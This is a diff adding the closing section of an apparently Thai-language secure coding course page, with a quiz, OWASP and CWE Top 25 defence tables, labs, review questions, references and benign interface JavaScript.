+      <h4>Interactive: Secure Coding Quiz — แนวทางปฏิบัติที่ปลอดภัย</h4>
+      <p>เลือกแนวปฏิบัติที่ถูกต้องสำหรับสถานการณ์ที่กำหนด</p>
+      <p style="font-weight:500;color:var(--navy)">ข้อ 1: วิธีป้องกัน SQL Injection ที่ดีที่สุดคือ?</p>
+      <button class="quiz-option" data-quiz="scq1" data-correct="false">Escape Special Characters ก่อนส่ง Query</button>
+      <button class="quiz-option" data-quiz="scq1" data-correct="true">ใช้ Prepared Statement / Parameterized Query</button>
+      <button class="quiz-option" data-quiz="scq1" data-correct="false">ใช้ Blocklist กรองคำว่า DROP, SELECT, UNION</button>
+      <div id="scq1Result" class="result">คลิกเพื่อเลือกคำตอบ</div>
+      <p style="font-weight:500;color:var(--navy);margin-top:1.25rem">ข้อ 2: เมื่อ Error เกิดขึ้นใน Production ควรทำอย่างไร?</p>
+      <button class="quiz-option" data-quiz="scq2" data-correct="false">แสดง Stack Trace ให้ผู้ใช้เห็นเพื่อให้แจ้ง Bug</button>
+      <button class="quiz-option" data-quiz="scq2" data-correct="true">Log Stack Trace ใน Server และแสดงข้อความทั่วไปให้ผู้ใช้</button>
+      <button class="quiz-option" data-quiz="scq2" data-correct="false">Catch Exception แล้วไม่ทำอะไร (ปล่อยผ่าน)</button>
+      <div id="scq2Result" class="result">คลิกเพื่อเลือกคำตอบ</div>
+      <p style="font-weight:500;color:var(--navy);margin-top:1.25rem">ข้อ 3: การป้องกัน Path Traversal ที่ถูกต้องคือ?</p>
+      <button class="quiz-option" data-quiz="scq3" data-correct="false">ลบเครื่องหมาย <code>../</code> ออกจาก Path</button>
+      <button class="quiz-option" data-quiz="scq3" data-correct="false">ตรวจสอบว่า File Extension อนุญาต</button>
+      <button class="quiz-option" data-quiz="scq3" data-correct="true">Canonicalize Path แล้วตรวจสอบ Prefix กับ Base Directory</button>
+      <div id="scq3Result" class="result">คลิกเพื่อเลือกคำตอบ</div>
+      <p style="font-weight:500;color:var(--navy);margin-top:1.25rem">ข้อ 4: ภาษาใดที่ป้องกัน Buffer Overflow และ Use-after-Free ได้ในระดับ Compile-time?</p>
+      <button class="quiz-option" data-quiz="scq4" data-correct="false">Java</button>
+      <button class="quiz-option" data-quiz="scq4" data-correct="false">Go</button>
+      <button class="quiz-option" data-quiz="scq4" data-correct="true">Rust</button>
+      <button class="quiz-option" data-quiz="scq4" data-correct="false">Python</button>
+      <div id="scq4Result" class="result">คลิกเพื่อเลือกคำตอบ</div>
+      <p style="font-weight:500;color:var(--navy);margin-top:1.25rem">ข้อ 5: Fail Safe ในบริบทความปลอดภัยหมายถึงอะไร?</p>
+      <button class="quiz-option" data-quiz="scq5" data-correct="true">Deny by Default — เมื่อไม่แน่ใจให้ปฏิเสธการเข้าถึง</button>
+      <button class="quiz-option" data-quiz="scq5" data-correct="false">Allow by Default — ให้ทุกอย่างผ่านก่อน แล้วค่อยตรวจสอบทีหลัง</button>
+      <button class="quiz-option" data-quiz="scq5" data-correct="false">Retry จนกว่าจะสำเร็จ</button>
+      <div id="scq5Result" class="result">คลิกเพื่อเลือกคำตอบ</div>
+    </div>
+    <h3 id="s7-2">9.7.2 Top Secure Coding Practices (OWASP)</h3>
+    <div class="table-wrap"><table><thead><tr><th style="text-align:center">ลำดับ</th><th>แนวปฏิบัติ</th><th>รายละเอียด</th></tr></thead><tbody>
+      <tr><td style="text-align:center">1</td><td>Validate Input จากทุกแหล่ง</td><td>HTTP Request, File, DB, API, Environment Variables</td></tr>
+      <tr><td style="text-align:center">2</td><td>Output Encode ตาม Context</td><td>HTML Entity, URL Encoding, JavaScript Unicode Escaping</td></tr>
+      <tr><td style="text-align:center">3</td><td>Parameterize Database Queries</td><td>Prepared Statements, ORM</td></tr>
+      <tr><td style="text-align:center">4</td><td>Authentication และ Session Management ที่ปลอดภัย</td><td>JWT, OAuth 2.0, HTTP-Only Cookies</td></tr>
+      <tr><td style="text-align:center">5</td><td>Access Control ทุกระดับ</td><td>Endpoint Level + Data Level</td></tr>
+      <tr><td style="text-align:center">6</td><td>Cryptography Practices</td><td>AES-GCM, Argon2, ไม่ Roll Your Own Crypto</td></tr>
+      <tr><td style="text-align:center">7</td><td>Error Handling ที่ปลอดภัย</td><td>Centralized Handler, No Stack Trace Leak</td></tr>
+      <tr><td style="text-align:center">8</td><td>Secure File Management</td><td>File Type Validation, Path Traversal Prevention</td></tr>
+      <tr><td style="text-align:center">9</td><td>Secure Logging</td><td>Mask Sensitive Data, Centralized Logging</td></tr>
+      <tr><td style="text-align:center">10</td><td>Dependency Management</td><td>SCA, Update Libraries, Remove Unused Dependencies</td></tr>
+    </tbody></table></div>
+    <h3 id="s7-3">9.7.3 CWE Top 25 Mapping (2025)</h3>
+    <div class="table-wrap"><table><thead><tr><th>CWE</th><th>Secure Coding Practice ที่เกี่ยวข้อง</th></tr></thead><tbody>
+      <tr><td>CWE-79 (XSS)</td><td>Output Encoding, CSP</td></tr>
+      <tr><td>CWE-89 (SQL Injection)</td><td>Parameterized Query</td></tr>
+      <tr><td>CWE-352 (CSRF)</td><td>Anti-CSRF Token, SameSite Cookie</td></tr>
+      <tr><td>CWE-862 (Missing Authorization)</td><td>Access Control ทุกระดับ</td></tr>
+      <tr><td>CWE-787 (Out-of-bounds Write)</td><td>Bounds Checking, Memory-safe Language</td></tr>
+      <tr><td>CWE-22 (Path Traversal)</td><td>Path Canonicalization</td></tr>
+      <tr><td>CWE-416 (Use After Free)</td><td>Memory-safe Language, Smart Pointers</td></tr>
+      <tr><td>CWE-125 (Out-of-bounds Read)</td><td>Bounds Checking, Memory-safe Language</td></tr>
+      <tr><td>CWE-78 (OS Command Injection)</td><td>Avoid Shell Command, Input Validation</td></tr>
+      <tr><td>CWE-94 (Code Injection)</td><td>Input Validation, Safe Eval</td></tr>
+      <tr><td>CWE-120/121/122 (Buffer Overflow)</td><td>Memory-safe Language, Stack Canary, ASLR, DEP</td></tr>
+      <tr><td>CWE-434 (File Upload)</td><td>File Type Validation, Magic Number</td></tr>
+      <tr><td>CWE-476 (NULL Pointer Dereference)</td><td>Null Check ก่อน Dereference</td></tr>
+      <tr><td>CWE-502 (Deserialization)</td><td>Input Validation, Allowlist Classes</td></tr>
+      <tr><td>CWE-20 (Input Validation)</td><td>Input Validation ทุกแหล่ง</td></tr>
+      <tr><td>CWE-284 (Improper Access Control)</td><td>Access Control, Default Deny</td></tr>
+      <tr><td>CWE-200 (Information Exposure)</td><td>Error Handling, Log Sanitization</td></tr>
+      <tr><td>CWE-306 (Missing Authentication)</td><td>Authentication ทุก Endpoint</td></tr>
+      <tr><td>CWE-918 (SSRF)</td><td>URL Validation, Allowlist</td></tr>
+      <tr><td>CWE-77 (Command Injection)</td><td>Avoid Shell Command, Input Validation</td></tr>
+      <tr><td>CWE-770 (Resource Exhaustion)</td><td>Rate Limiting, Resource Quotas</td></tr>
+    </tbody></table></div>
+    <div class="info-box remember" id="summary">
+      <span class="icon">📌</span>
+      <div>
+        <strong>สรุปท้ายบท:</strong>
+        <ul style="margin:.35rem 0 0;padding-left:1.25rem">
+          <li>Defensive Programming คือการเขียนโค้ดโดยสมมติว่าสิ่งที่ผิดพลาดได้จะผิดพลาด — ต้องมี Input Validation, Output Encoding, และ Defensive Copying</li>
+          <li>Error Handling ต้องไม่รั่วไหล Stack Trace หรือข้อมูลภายใน — ใช้ Centralized Global Handler และข้อความทั่วไปกับผู้ใช้</li>
+          <li>Memory Safety เป็นปัญหาหลักของ C/C++ — ใช้ Stack Canary, ASLR, DEP และพิจารณาใช้ Memory-safe Languages เช่น Rust</li>
+          <li>File Upload และ File Management ต้องมี Defense in Depth — Path Canonicalization, Magic Number Validation, TOCTOU Protection</li>
+          <li>Logging ต้องปลอดภัย — ไม่ Log Passwords, Secrets, PII; ใช้ Masking, Log Rotation, และ Access Control</li>
+          <li>CWE Top 25 เป็นกรอบอ้างอิงสำคัญ — ทุก CWE มี Secure Coding Practice ที่เกี่ยวข้อง</li>
+        </ul>
+      </div>
+    </div>    <h2 id="keywords">Keywords</h2>
+    <p>Secure Coding, Defensive Programming, Input Validation, Output Encoding, Exception Handling, Stack Trace, Global Error Handler, Memory Safety, Buffer Overflow, Stack Canary, ASLR, DEP, Use-after-Free, Dangling Pointer, Format String, Path Traversal, File Upload, TOCTOU, Race Condition, Log Sanitization, Logging, CWE Top 25, OWASP Secure Coding, CERT/SEI, Fail Safe, Fail Fast, Immutable Object, Defensive Copying, Memory-safe Language, Resource Leak</p>
+    <h2 id="labs">กิจกรรมปฏิบัติการ</h2>
+    <div class="card"><div class="card-header">Lab 9.1: Secure Code Review</div><ul>
+      <li>ตรวจสอบ Source Code ที่มี Intentional Vulnerabilities (จาก GitHub: OWASP/NodeGoat, OWASP/WebGoat)</li>
+      <li>ระบุช่องโหว่ CWE แต่ละรายการ พร้อมบรรทัดที่พบ และระดับความรุนแรง</li>
+      <li>เสนอแนวทางแก้ไขและเขียนโค้ดที่ปลอดภัย</li>
+    </ul></div>
+    <div class="card"><div class="card-header">Lab 9.2: ใช้ SAST Tools สแกนหาช่องโหว่</div><ul>
+      <li>ติดตั้งและใช้งาน Semgrep, Snyk, หรือ CodeQL</li>
+      <li>สแกนตัวอย่างโค้ดที่มี Intentional Vulnerabilities</li>
+      <li>วิเคราะห์ผลลัพธ์: False Positive / True Positive</li>
+      <li>เปรียบเทียบความสามารถของ SAST Tools แต่ละตัว</li>
+    </ul></div>
+    <div class="card"><div class="card-header">Lab 9.3: Secure File Upload</div><ul>
+      <li>Implement File Upload Function ที่ปลอดภัย</li>
+      <li>ตรวจสอบ File Type ด้วย Magic Number (ไม่ใช่แค่ Extension)</li>
+      <li>จำกัดขนาดไฟล์ และ Sanitize ชื่อไฟล์</li>
+      <li>จัดเก็บไฟล์นอก Web Root และ Serve ผ่าน Script</li>
+      <li>ทดสอบ Path Traversal, Double Extension, และ Null Byte Injection</li>
+    </ul></div>
+    <div class="card"><div class="card-header">Lab 9.4: Exception Handling และ Secure Logging</div><ul>
+      <li>เขียน Global Error Handler ที่ไม่รั่วไหลข้อมูล</li>
+      <li>สร้าง Custom Error Pages (404, 500, 403)</li>
+      <li>Implement Log Sanitization — Mask รหัสผ่านและข้อมูลสำคัญ</li>
+      <li>ตั้งค่า Log Rotation และ File Permission</li>
+    </ul></div>
+    <h2 id="questions">คำถามท้ายบท</h2>
+    <ol>
+      <li>Defensive Programming คืออะไร และแตกต่างจากการเขียนโปรแกรมทั่วไปอย่างไร? ยกตัวอย่างหลักการที่สำคัญ 3 ข้อ</li>
+      <li>Immutable Objects ช่วยป้องกันช่องโหว่ด้านความปลอดภัยได้อย่างไร? จงอธิบายพร้อมตัวอย่างโค้ด</li>
+      <li>เหตุใดการแสดง Stack Trace ให้ผู้ใช้เห็นจึงไม่ปลอดภัย? ข้อมูลใดบ้างที่อาจรั่วไหลจาก Stack Trace?</li>
+      <li>Buffer Overflow เกิดขึ้นได้อย่างไร? จงอธิบายกลไก Stack Canary, ASLR, และ DEP ว่าป้องกัน Buffer Overflow อย่างไร</li>
+      <li>ภาษา Rust ป้องกัน Use-after-Free และ Dangling Pointer ได้อย่างไรเมื่อเทียบกับภาษา C/C++?</li>
+      <li>Path Traversal (CWE-22) คืออะไร? จงอธิบายวิธีการป้องกัน 3 วิธีพร้อมตัวอย่างโค้ด</li>
+      <li>File Upload มีความเสี่ยงอะไรบ้าง? จงอธิบายมาตรการป้องกันแบบ Defense in Depth</li>
+      <li>TOCTOU (Time of Check, Time of Use) Race Condition คืออะไร? แตกต่างจาก Race Condition ทั่วไปอย่างไร?</li>
+      <li>ข้อมูลประเภทใดบ้างที่ไม่ควรบันทึกใน Log? จงอธิบายเทคนิค Log Sanitization และ Masking พร้อมตัวอย่าง</li>
+      <li>Fail Fast และ Fail Safe แตกต่างกันอย่างไร? ในบริบทความปลอดภัย แนวทางใดเหมาะสมกับ Production มากกว่ากัน?</li>
+      <li>Integer Overflow อาจนำไปสู่ช่องโหว่ด้านความปลอดภัยได้อย่างไร? จงยกตัวอย่างสถานการณ์จริง</li>
+      <li>Centralized Logging และ Log Retention มีความสำคัญอย่างไรในมุมมอง Security Operations?</li>
+      <li>ถ้านักพัฒนาพบว่ามี Hardcoded Database Credentials ใน Source Code ที่ commit ไปแล้ว ควรดำเนินการอย่างไร?</li>
+      <li>OWASP Top 10 Proactive Controls (2024) มีอะไรบ้าง? จงเลือกมา 5 ข้อที่คิดว่าสำคัญที่สุดพร้อมเหตุผล</li>
+    </ol>
+    <h2 id="refs">เอกสารอ้างอิง</h2>
+    <ol style="font-size:.88rem">
+      <li>OWASP Developer Guide (เดิม OWASP Secure Coding Practices — ถูก Archive แล้ว)</li>
+      <li>OWASP Top 10 Proactive Controls v4.0.0 (2024)</li>
+      <li>SEI CERT Coding Standards — Carnegie Mellon University</li>
+      <li>CWE Top 25 Most Dangerous Software Weaknesses — MITRE (2025)</li>
+      <li>NIST SP 800-218 — Secure Software Development Framework (SSDF) v1.1</li>
+      <li>NSA + CISA (2025). <em>Memory Safe Languages: Reducing Vulnerabilities in Modern Software Development</em></li>
+      <li>NSA (2022). <em>Software Memory Safety</em></li>
+      <li>White House (2024). <em>Back to the Building Blocks: A Call for Memory Safe Software</em></li>
+      <li>Seacord, R. (2013). <em>Secure Coding in C and C++</em> (2nd ed.). Addison-Wesley</li>
+      <li>Long, F. et al. (2022). <em>Java Coding Guidelines: 75 Recommendations for Reliable and Secure Programs</em></li>
+      <li>The Rust Programming Language — Chapter 4: Ownership</li>
+      <li>Microsoft SDL — Security Development Lifecycle Practices</li>
+      <li>OWASP ASVS (Application Security Verification Standard) v4.0.3</li>
+      <li>OWASP Cheat Sheet Series — File Upload, Logging, Error Handling</li>
+      <li>MITRE CWE — CWE-134: Format String Vulnerability</li>
+      <li>MITRE CWE — CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition</li>
+      <li>MITRE CWE — CWE-416: Use After Free</li>
+      <li>MITRE CWE — CWE-787: Out-of-bounds Write</li>
+      <li>Google Security Blog — Android Memory Safety (2025)</li>
+      <li>Microsoft Security Response Center (MSRC) — Annual Vulnerability Report</li>
+      <li>Shostack, A. (2014). <em>Threat Modeling: Designing for Security</em>. Wiley</li>
+      <li>Open Source Security Foundation (OpenSSF) — Secure Coding Practices Guide</li>
+    </ol>
+  </div>
+</div>
+<script>
+(function(){
+  var toggles = document.getElementById("sidebarToggle");
+  var sidebar = document.getElementById("sidebar");
+  var overlay = document.getElementById("sidebarOverlay");
+  if (toggles) {
+    toggles.addEventListener("click", function(){
+      sidebar.classList.toggle("open");
+      overlay.classList.toggle("show");
+    });
+  }
+  if (overlay) {
+    overlay.addEventListener("click", function(){
+      sidebar.classList.remove("open");
+      overlay.classList.remove("show");
+    });
+  }
+
+  var links = sidebar.querySelectorAll("a");
+  links.forEach(function(a){
+    a.addEventListener("click", function(){
+      links.forEach(function(l){ l.classList.remove("active"); });
+      this.classList.add("active");
+      if (window.innerWidth <= 1024) {
+        sidebar.classList.remove("open");
+        overlay.classList.remove("show");
+      }
+    });
+  });
+
+  var tabBars = document.querySelectorAll(".tab-bar");
+  tabBars.forEach(function(bar){
+    var btns = bar.querySelectorAll(".tab-btn");
+    btns.forEach(function(btn){
+      btn.addEventListener("click", function(){
+        btns.forEach(function(b){ b.classList.remove("active"); });
+        this.classList.add("active");
+        var container = this.closest(".interactive");
+        var panels = container.querySelectorAll(".tab-panel");
+        panels.forEach(function(p){ p.classList.remove("active"); });
+        var target = container.querySelector("#panel-" + this.getAttribute("data-tab"));
+        if (target) target.classList.add("active");
+      });
+    });
+  });
+
+  var quizOpts = document.querySelectorAll(".quiz-option");
+  quizOpts.forEach(function(opt){
+    opt.addEventListener("click", function(){
+      var container = this.closest(".interactive");
+      var qname = this.getAttribute("data-quiz");
+      var correct = this.getAttribute("data-correct") === "true";
+      var allOpts = container.querySelectorAll(".quiz-option");
+      allOpts.forEach(function(o){
+        o.classList.remove("correct", "incorrect");
+        o.style.opacity = "0.6";
+      });
+      this.style.opacity = "1";
+      if (correct) {
+        this.classList.add("correct");
+        var r = container.querySelector("#" + qname + "Result");
+        if (r) r.textContent = "✓ ถูกต้อง! คำตอบนี้ปลอดภัยและเหมาะสม";
+      } else {
+        this.classList.add("incorrect");
+        var r = container.querySelector("#" + qname + "Result");
+        if (r) r.textContent = "✗ ไม่ถูกต้อง ลองเลือกคำตอบอื่น";
+      }
+    });
+  });
+
+  var checklists = document.querySelectorAll(".checklist");
+  checklists.forEach(function(cl){
+    var parent = cl.parentElement;
+    var result = parent.querySelector(".result");
+    var meter = parent.querySelector(".meter-fill");
+    var inputs = cl.querySelectorAll("input[type=checkbox]");
+    function update(){
+      var checked = 0;
+      inputs.forEach(function(inp){ if(inp.checked) checked++; });
+      var pct = inputs.length > 0 ? Math.round(checked / inputs.length * 100) : 0;
+      if (meter) meter.style.width = pct + "%";
+      if (result) result.textContent = "ตรวจสอบแล้ว " + checked + " จาก " + inputs.length + " รายการ (" + pct + "%)";
+    }
+    inputs.forEach(function(inp){ inp.addEventListener("change", update); });
+    update();
+  });
+
+  var memCards = document.querySelectorAll(".memory-card");
+  memCards.forEach(function(card){
+    card.addEventListener("click", function(){
+      var wasExpanded = this.classList.contains("expanded");
+      memCards.forEach(function(c){
+        c.classList.remove("expanded");
+        var desc = c.querySelector(".card-desc");
+        if (desc) desc.classList.remove("show");
+      });
+      if (!wasExpanded) {
+        this.classList.add("expanded");
+        var desc = this.querySelector(".card-desc");
+        if (desc) desc.classList.add("show");
+        var detail = this.closest(".interactive").querySelector("#memoryDetail");
+        var title = this.querySelector(".card-title");
+        if (detail && title) detail.textContent = "กำลังดู: " + title.textContent;
+      } else {
+        var detail = this.closest(".interactive").querySelector("#memoryDetail");
+        if (detail) detail.textContent = "คลิกที่กลไกเพื่อดูรายละเอียด";
+      }
+    });
+  });
+
+  var readingProgress = document.getElementById("readingProgress");
+  if (readingProgress) {
+    document.addEventListener("scroll", function(){
+      var scrollTop = window.scrollY;
+      var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+      var pct = docHeight > 0 ? Math.min(100, Math.round(scrollTop / docHeight * 100)) : 0;
+      readingProgress.textContent = "Software Security · " + pct + "%";
+    });
+  }
+
+  var allCheckboxes = document.querySelectorAll("#chkDefensive input, #chkError input, #chkMemory input, #chkFile input, #chkLog input");
+  var totalMeter = document.getElementById("chkTotalMeter");
+  var totalResult = document.getElementById("chkTotalResult");
+  if (totalMeter && totalResult) {
+    function updateTotal() {
+      var checked = 0;
+      var total = allCheckboxes.length;
+      allCheckboxes.forEach(function(cb) { if (cb.checked) checked++; });
+      var pct = total > 0 ? Math.round(checked / total * 100) : 0;
+      totalMeter.style.width = pct + "%";
+      totalResult.textContent = "ผ่าน " + checked + " จาก " + total + " รายการ (" + pct + "%)";
+    }
+    allCheckboxes.forEach(function(cb) { cb.addEventListener("change", updateTotal); });
+    updateTotal();
+  }
+})();
+</script>
+<div style="text-align:center;padding:1rem;font-size:0.75rem;color:var(--text-muted, #64748b);border-top:1px solid var(--border, #e2e8f0)">Powered by: IceSuntisuk</div></body>
+</html>
